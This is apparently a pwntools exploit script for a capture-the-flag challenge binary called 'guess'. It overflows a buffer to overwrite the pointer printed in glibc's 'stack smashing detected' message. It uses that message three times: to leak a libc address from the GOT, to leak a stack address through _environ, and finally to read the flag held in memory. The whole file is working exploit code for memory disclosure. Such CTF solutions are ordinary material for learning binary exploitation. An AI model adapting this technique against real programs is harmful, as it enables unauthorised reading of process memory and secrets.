from pwn import *

#context.log_level = 'debug'
p = process('./guess')

#gdb.attach(p,gdbscript='''
#set follow-fork-mod on
#b main
#b *0x400a19
#b *0x400b23
#b *0x400b9c
#''')

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

libc_start_main_got = 0x602048

raw_input("leak libc_base")
p.recvuntil('guessing flag\n')
payload = 'A' * 0x128 + p64(libc_start_main_got)
p.sendline(payload)
p.recvuntil('detected ***: ')
libc_start_main_addr = u64(p.recv(6).ljust(0x8,'\x00'))
libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
print 'libc_base_addr = ' + hex(libc_base_addr)

raw_input("leak environ_addr")
environ_addr = libc_base_addr + libc.symbols['_environ']
payload1 = 'A' * 0x128 + p64(environ_addr)
p.recvuntil('Please type your guessing flag')
p.sendline(payload1)
p.recvuntil('stack smashing detected ***: ')
stack_addr = u64(p.recv(6).ljust(0x8,'\x00'))
print 'stack_addr = ' + hex(stack_addr)

raw_input("leak flag")
payload2 = 'A' * 0x128 + p64(stack_addr - 0x168)
p.recvuntil('Please type your guessing flag')
p.sendline(payload2)
print p.recvuntil('}')
